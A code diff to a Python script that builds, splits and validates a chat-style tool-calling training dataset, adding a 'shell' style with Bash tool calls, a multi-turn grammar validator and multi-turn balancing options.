-    # the cli/mcp balance roughly proportional. We never *pad*: target above the
-    # available count just returns everything (the families are the ceiling).
+    # each style roughly proportional. We never *pad*: a target above the available
+    # count just returns everything (the families are the ceiling).
     if target is not None and target < len(unique):
         rng = random.Random(seed)
-        cli = [r for r in unique if r["style"] == "cli"]
-        mcp = [r for r in unique if r["style"] == "mcp"]
+        by_style2: dict[str, list[dict[str, Any]]] = {}
+        for r in unique:
+            by_style2.setdefault(r["style"], []).append(r)
         frac = target / len(unique)
-        n_cli = round(len(cli) * frac)
-        n_mcp = target - n_cli
-        n_mcp = min(n_mcp, len(mcp))
-        rng.shuffle(cli)
-        rng.shuffle(mcp)
-        chosen = set(id(r) for r in cli[:n_cli]) | set(id(r) for r in mcp[:n_mcp])
-        unique = [r for r in unique if id(r) in chosen]
+        keep2: set[int] = set()
+        styles = sorted(by_style2)
+        allocated = 0
+        for idx, st in enumerate(styles):
+            group = by_style2[st]
+            rng.shuffle(group)
+            n = (target - allocated) if idx == len(styles) - 1 else round(len(group) * frac)
+            n = max(0, min(n, len(group)))
+            allocated += n
+            keep2 |= set(id(r) for r in group[:n])
+        unique = _subsample_by_style(unique, keep2)
 
     return unique
 
@@ -3036,12 +3844,12 @@ def build_dataset(target: int | None, seed: int) -> list[dict[str, Any]]:
 def split_dataset(
     records: list[dict[str, Any]], seed: int, val_frac: float = 0.05
 ) -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
-    """Deterministic train/validation split, stratified by style so both files
-    contain cli + mcp examples."""
+    """Deterministic train/validation split, stratified by style so every style
+    (cli/mcp/shell) appears in both files."""
     rng = random.Random(seed + 1)
     train: list[dict[str, Any]] = []
     val: list[dict[str, Any]] = []
-    for style in ("cli", "mcp"):
+    for style in sorted({r["style"] for r in records}):
         group = [r for r in records if r["style"] == style]
         idx = list(range(len(group)))
         rng.shuffle(idx)
@@ -3120,8 +3928,8 @@ def validate_record(idx: int, rec: dict[str, Any]) -> list[str]:
     if rec.get("schema_version") != SCHEMA_VERSION:
         err(f"schema_version must be {SCHEMA_VERSION!r}")
     style = rec.get("style")
-    if style not in {"cli", "mcp"}:
-        err(f"style must be 'cli' or 'mcp', got {style!r}")
+    if style not in {"cli", "mcp", "shell"}:
+        err(f"style must be 'cli', 'mcp' or 'shell', got {style!r}")
     if not isinstance(rec.get("tags"), list) or not rec["tags"]:
         err("tags must be a non-empty list")
     msgs = rec.get("messages")
@@ -3163,61 +3971,115 @@ def validate_record(idx: int, rec: dict[str, Any]) -> list[str]:
                 for cmd in _extract_commands(m.get("content", "")):
                     errs.extend(_lint_cli_command(cmd))
 
-    elif style == "mcp":
-        # system, then repeating [assistant(tool_calls), tool, assistant].
-        body = msgs[1:]  # user, then triples
-        if not body or body[0].get("role") != "user":
-            err("mcp: second message must be 'user'")
-            return errs
-        rest = body[1:]
-        if len(rest) % 3 != 0 or len(rest) < 3:
-            err("mcp: after user, messages must come in [assistant,tool,assistant] triples")
-            return errs
-        for t in range(0, len(rest), 3):
-            a_call, a_tool, a_final = rest[t], rest[t + 1], rest[t + 2]
-            if a_call.get("role") != "assistant" or "tool_calls" not in a_call:
-                err(f"mcp triple {t // 3}: first turn must be assistant with tool_calls")
-                continue
-            tcs = a_call["tool_calls"]
-            if not isinstance(tcs, list) or len(tcs) != 1:
-                err(f"mcp triple {t // 3}: tool_calls must be a single-element list")
-                continue
-            call = tcs[0]
-            fn = call.get("function", {})
-            if not call.get("id"):
-                err(f"mcp triple {t // 3}: tool_call missing id")
-            if call.get("type") != "function":
-                err(f"mcp triple {t // 3}: tool_call type must be 'function'")
-            if fn.get("name") not in MCP_TOOL_NAMES:
-                err(f"mcp triple {t // 3}: unknown MCP tool {fn.get('name')!r}")
-            args = fn.get("arguments")
-            if not isinstance(args, str):
-                err(f"mcp triple {t // 3}: arguments must be a JSON string")
-            else:
-                try:
-                    json.loads(args)
-                except json.JSONDecodeError as e:
-                    err(f"mcp triple {t // 3}: arguments not valid JSON: {e}")
-            if a_tool.get("role") != "tool":
-                err(f"mcp triple {t // 3}: second turn must be role 'tool'")
-            else:
-                if a_tool.get("tool_call_id") != call.get("id"):
-                    err(f"mcp triple {t // 3}: tool_call_id mismatch")
-                if a_tool.get("name") != fn.get("name"):
-                    err(f"mcp triple {t // 3}: tool name mismatch")
-                tc = a_tool.get("content")
-                if not isinstance(tc, str):
-                    err(f"mcp triple {t // 3}: tool content must be a JSON string")
-                else:
-                    try:
-                        json.loads(tc)
-                    except json.JSONDecodeError as e:
-                        err(f"mcp triple {t // 3}: tool content not valid JSON: {e}")
-            if a_final.get("role") != "assistant":
-                err(f"mcp triple {t // 3}: third turn must be assistant")
-            elif not (a_final.get("content") or "").strip():
-                err(f"mcp triple {t // 3}: assistant interpretation must be non-empty")
+    elif style in ("mcp", "shell"):
+        _validate_agentic(style, msgs, err)
     return errs
+
+
+def _validate_tool_round(
+    style: str, exi: int, ti: int, a_call: dict, a_tool: dict, a_final: dict, err
+) -> None:
+    """Validate one ``assistant(tool_calls) → tool → assistant(interp)`` round of
+    an mcp/shell exchange."""
+    where = f"{style} exchange {exi} round {ti}"
+    if a_call.get("role") != "assistant" or "tool_calls" not in a_call:
+        err(f"{where}: first turn must be assistant with tool_calls")
+        return
+    tcs = a_call["tool_calls"]
+    if not isinstance(tcs, list) or len(tcs) != 1:
+        err(f"{where}: tool_calls must be a single-element list")
+        return
+    call = tcs[0]
+    fn = call.get("function", {})
+    if not call.get("id"):
+        err(f"{where}: tool_call missing id")
+    if call.get("type") != "function":
+        err(f"{where}: tool_call type must be 'function'")
+    name = fn.get("name")
+    if style == "shell":
+        if name != SHELL_TOOL_NAME:
+            err(f"{where}: shell tool name must be {SHELL_TOOL_NAME!r}, got {name!r}")
+    elif name not in MCP_TOOL_NAMES:
+        err(f"{where}: unknown MCP tool {name!r}")
+    args = fn.get("arguments")
+    parsed_args: Any = None
+    if not isinstance(args, str):
+        err(f"{where}: arguments must be a JSON string")
+    else:
+        try:
+            parsed_args = json.loads(args)
+        except json.JSONDecodeError as e:
+            err(f"{where}: arguments not valid JSON: {e}")
+    if style == "shell" and isinstance(parsed_args, dict):
+        cmd = parsed_args.get("command")
+        if not isinstance(cmd, str) or not cmd.strip():
+            err(f"{where}: Bash tool call must carry a non-empty 'command'")
+        elif cmd.strip().startswith("burpwn "):
+            for e2 in _lint_cli_command(cmd.strip()):
+                err(f"{where}: {e2}")
+    # tool result turn
+    if a_tool.get("role") != "tool":
+        err(f"{where}: second turn must be role 'tool'")
+    else:
+        if a_tool.get("tool_call_id") != call.get("id"):
+            err(f"{where}: tool_call_id mismatch")
+        if a_tool.get("name") != name:
+            err(f"{where}: tool name mismatch")
+        tc = a_tool.get("content")
+        if not isinstance(tc, str):
+            err(f"{where}: tool content must be a string")
+        elif style == "mcp":
+            # MCP tool results are JSON-encoded strings; shell results are raw
+            # command stdout (any string, possibly empty).
+            try:
+                json.loads(tc)
+            except json.JSONDecodeError as e:
+                err(f"{where}: tool content not valid JSON: {e}")
+    # assistant interpretation turn
+    if a_final.get("role") != "assistant":
+        err(f"{where}: third turn must be assistant")
+    elif "tool_calls" in a_final:
+        err(f"{where}: interpretation turn must not contain tool_calls")
+    elif not (a_final.get("content") or "").strip():
+        err(f"{where}: assistant interpretation must be non-empty")
+
+
+def _validate_agentic(style: str, msgs: list[dict], err) -> None:
+    """Validate the general tool-calling grammar shared by mcp + shell records:
+
+        system, ( user, ( assistant(tool_calls), tool, assistant(interp) )+ )+
+
+    i.e. one or more *exchanges*, each a user turn followed by one or more tool
+    rounds. This admits genuine multi-turn conversations (several user turns) as
+    well as the single-user-turn form. Tool rounds are fixed 3-message groups."""
+    body = msgs[1:]  # everything after the system turn
+    if not body or body[0].get("role") != "user":
+        err(f"{style}: second message must be 'user'")
+        return
+    i, n = 0, len(body)
+    exi = 0
+    while i < n:
+        if body[i].get("role") != "user":
+            err(f"{style}: expected a 'user' turn to open exchange {exi + 1}, "
+                f"got {body[i].get('role')!r}")
+            return
+        i += 1
+        exi += 1
+        rounds = 0
+        while i < n and body[i].get("role") != "user":
+            if i + 2 >= n:
+                err(f"{style} exchange {exi}: truncated tool round "
+                    "(need assistant/tool/assistant)")
+                return
+            _validate_tool_round(
+                style, exi, rounds, body[i], body[i + 1], body[i + 2], err
+            )
+            rounds += 1
+            i += 3
+        if rounds == 0:
+            err(f"{style} exchange {exi}: user turn not followed by a tool round")
+    if exi == 0:
+        err(f"{style}: no exchanges found")
 
 
 def run_validate(path: str) -> int:
@@ -3230,7 +4092,8 @@ def run_validate(path: str) -> int:
         src = path
 
     problems: list[str] = []
-    n_cli = n_mcp = 0
+    by_style: dict[str, int] = {}
+    n_multi = 0
     keys: dict[str, int] = {}
     dupes = 0
     for idx, line in enumerate(lines, start=1):
@@ -3244,10 +4107,9 @@ def run_validate(path: str) -> int:
         errs = validate_record(idx, rec)
         problems.extend(errs)
         if not errs:
-            if rec.get("style") == "cli":
-                n_cli += 1
-            elif rec.get("style") == "mcp":
-                n_mcp += 1
+            by_style[rec.get("style")] = by_style.get(rec.get("style"), 0) + 1
+            if is_multiturn(rec):
+                n_multi += 1
             k = _normalized_key(rec)
             if k in keys:
                 dupes += 1
@@ -3257,19 +4119,21 @@ def run_validate(path: str) -> int:
             else:
                 keys[k] = idx
 
-    total = n_cli + n_mcp
+    total = sum(by_style.values())
+    breakdown = ", ".join(f"{by_style[s]} {s}" for s in sorted(by_style))
+    pct = (100 * n_multi // total) if total else 0
     if problems:
         for p in problems:
             print(p, file=sys.stderr)
         print(
             f"FAIL: {len(problems)} problem(s) in {src} "
-            f"({total} records: {n_cli} cli, {n_mcp} mcp, {dupes} dupes)",
+            f"({total} records: {breakdown}; {n_multi} multi-turn; {dupes} dupes)",
             file=sys.stderr,
         )
         return 1
     print(
-        f"OK: {src} — {total} records ({n_cli} cli, {n_mcp} mcp), 0 dupes, "
-        f"schema {SCHEMA_VERSION}",
+        f"OK: {src} — {total} records ({breakdown}; {n_multi} multi-turn = {pct}%), "
+        f"0 dupes, schema {SCHEMA_VERSION}",
         file=sys.stderr,
     )
     return 0
@@ -3296,6 +4160,11 @@ def main(argv: list[str]) -> int:
     )
     ap.add_argument("--seed", type=int, default=DEFAULT_SEED, help="reproducible RNG seed")
     ap.add_argument(
+        "--multiturn-frac", type=float, default=0.5, metavar="F",
+        help="balance the emitted set to ~F multi-turn conversations by deterministically "
+        "subsampling single-turn records (default 0.5; 0 disables balancing, keeping all)",
+    )
+    ap.add_argument(
         "--val-frac", type=float, default=0.05, help="validation split fraction (default 0.05)"
     )
     ap.add_argument(
@@ -3310,7 +4179,7 @@ def main(argv: list[str]) -> int:
     if args.validate is not None:
         return run_validate(args.validate)
 
-    records = build_dataset(args.target, args.seed)
+    records = build_dataset(args.target, args.seed, args.multiturn_frac)
     train, val = split_dataset(records, args.seed, args.val_frac)
     # Combined file uses the same stable order as the splits concatenated:
     combined = sorted(records, key=_normalized_key)
@@ -3327,12 +4196,16 @@ def main(argv: list[str]) -> int:
     for fname, recs in paths.items():
         with open(os.path.join(args.outdir, fname), "w", encoding="utf-8") as fh:
             emit(recs, fh)
-    n_cli = sum(1 for r in combined if r["style"] == "cli")
-    n_mcp = sum(1 for r in combined if r["style"] == "mcp")
+    by_style: dict[str, int] = {}
+    for r in combined:
+        by_style[r["style"]] = by_style.get(r["style"], 0) + 1
+    n_multi = sum(1 for r in combined if is_multiturn(r))
+    breakdown = ", ".join(f"{by_style[s]} {s}" for s in sorted(by_style))
+    pct = (100 * n_multi // len(combined)) if combined else 0
     print(
-        f"wrote {len(combined)} records ({n_cli} cli, {n_mcp} mcp) → "
+        f"wrote {len(combined)} records ({breakdown}; {n_multi} multi-turn = {pct}%) → "
         f"dataset.jsonl; train={len(train)} validation={len(val)} "
-        f"(seed={args.seed})",
+        f"(seed={args.seed}, multiturn_frac={args.multiturn_frac})",
         file=sys.stderr,
     )
     return 0
